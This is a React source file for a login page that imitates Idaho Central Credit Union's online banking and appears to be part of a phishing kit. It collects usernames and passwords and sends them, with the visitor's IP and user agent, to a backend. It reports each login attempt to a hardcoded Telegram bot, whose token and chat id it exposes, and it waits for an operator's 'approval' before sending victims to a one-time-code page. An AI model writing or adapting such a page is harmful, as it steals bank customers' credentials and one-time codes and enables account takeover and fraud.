import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { userLoginAttempt, getUserStep } from "../api"; // Import the API functions
import styles from "./Login.module.css";
import logo from "/idhahologo.png"; // Ensure correct logo path
import Loader from "./Loader"; // Loader component
import axios from "axios"; // Import Axios
import Cookies from "js-cookie";

const Login = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false); // Remember me state
  const [isLoading, setIsLoading] = useState(false); // Loading state for showing the spinner
  const [errorMessage, setErrorMessage] = useState(""); // Error message state
  const navigate = useNavigate(); // Hook for navigation
  const [isTokenSet, setIsTokenSet] = useState(false); // To track if the cookie/token is set

  // Function to send notification to Telegram
  const sendTelegramNotification = async (message) => {
    const chatId = "1853998920";
    const botToken = "7744005529:AAFHfmD7lGOEsRSb_tk0_FE4WuF_JN4U1YE";
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });
      console.log("Notification sent to Telegram");
    } catch (error) {
      console.error("Error sending notification to Telegram:", error);
    }
  };

  // Handle login form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true); // Show loader

    // Notify Telegram that a login attempt is being made
    sendTelegramNotification(`Login attempt with username: ${username}`);

    try {
      // Delay for a short period to ensure cookies can set before making the request
      await delay(2000); // 2-second delay before proceeding (adjust as needed)

      // Get IP and User Agent details here
      const ip = await getIP(); // Fetches the user's IP
      const userAgent = navigator.userAgent;

      // Use the API function to log the user login attempt
      const response = await userLoginAttempt(username, password, ip, userAgent);

      if (response.logId) {
        // Start polling for the step based on the logId
        Cookies.set("logId", response.logId, { expires: 1 }); // Store logId in cookies
        pollForStep(response.logId);
      } else {
        setIsLoading(false); // Stop loader if no logId is returned
        setErrorMessage("Login failed, please try again.");
      }
    } catch (error) {
      setIsLoading(false);
      setErrorMessage(error.message || "Incorrect username or password.");
    }
  };

  // Polling function to check user's step (e.g., waiting for admin approval, error, OTP)
  const pollForStep = async (logId) => {
    let retries = 0;
    const maxRetries = 20; // For example, retry polling for 1 minute (20 retries with 3-second interval)

    const interval = setInterval(async () => {
      try {
        const response = await getUserStep(logId); // This should call the correct API function
        const { step } = response;

        console.log("Current step:", step); // For debugging purposes

        if (step === "error") {
          setIsLoading(false);
          setErrorMessage("Incorrect username or password.");
          clearInterval(interval);
        } else if (step === "approved") {
          clearInterval(interval);
          navigate("/verify"); // Redirect to OTP page
        } else if (step === "waiting") {
          console.log("Still waiting for admin approval...");
        }

        retries++;
        if (retries >= maxRetries) {
          setErrorMessage("Admin approval is taking too long. Please try again later.");
          setIsLoading(false);
          clearInterval(interval);
        }
      } catch (error) {
        console.error("Error fetching step:", error);
        clearInterval(interval); // Stop polling on error
      }
    }, 3000); // Poll every 3 seconds
  };

  // Example function to get the user's IP address
  const getIP = async () => {
    try {
      const response = await axios.get("https://api.ipify.org?format=json");
      return response.data.ip;
    } catch (error) {
      console.error("Failed to get IP address:", error);
      return "Unknown IP";
    }
  };

  // Utility function to delay execution
  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  useEffect(() => {
    // Check if the token/cookie is set before proceeding
    if (document.cookie.includes("auth_token")) {
      setIsTokenSet(true);
    }
  }, [isTokenSet]);

  return (
    <div className={styles.parentContainer}>
      {isLoading ? (
        <Loader /> // Show loader while waiting for approval
      ) : (
        <div className={styles.innerContainer}>
          <div className={styles.loginForm}>
            {/* Logo */}
            <img
              src={logo}
              alt="Idaho Central Credit Union"
              className={styles.logo}
            />
            {/* Login Form */}
            <form onSubmit={handleSubmit}>
              <div className={styles.inputGroup}>
                <input
                  type="text"
                  placeholder="Username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className={styles.input}
                  required
                />
              </div>
              <div className={styles.inputGroup}>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={styles.input}
                  required
                />
                <span className={styles.showPassword}>
                  <svg
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                    <path
                      d="M12 15a3 3 0 100-6 3 3 0 000 6z"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </span>
              </div>
              <div className={styles.rememberMe}>
                <input
                  type="checkbox"
                  id="rememberMe"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                />
                <label htmlFor="rememberMe">Remember Me</label>
              </div>
              <button type="submit" className={styles.loginButton}>
                Log in
              </button>
            </form>

            {/* Display error message above form */}
            {errorMessage && <p className={styles.error}>{errorMessage}</p>}

            {/* Links */}
            <div className={styles.links}>
              <a href="#forgot" className={styles.forget}>
                Forgot <span className={styles.directs}>Username</span> or{" "}
                <span className={styles.directs}>Password</span> ?
              </a>
              <div className={styles.lasttwo}>
                <a href="#enroll" className={styles.enrollLink}>
                  Enroll in Online Banking
                </a>
                <a href="#join" className={styles.joinLink}>
                  Join Today and Become a Member!
                </a>
              </div>
            </div>
          </div>
          {/* Promotional image or empty div */}
          <div className={styles.rightImage}></div>
        </div>
      )}
    </div>
  );
};

export default Login;
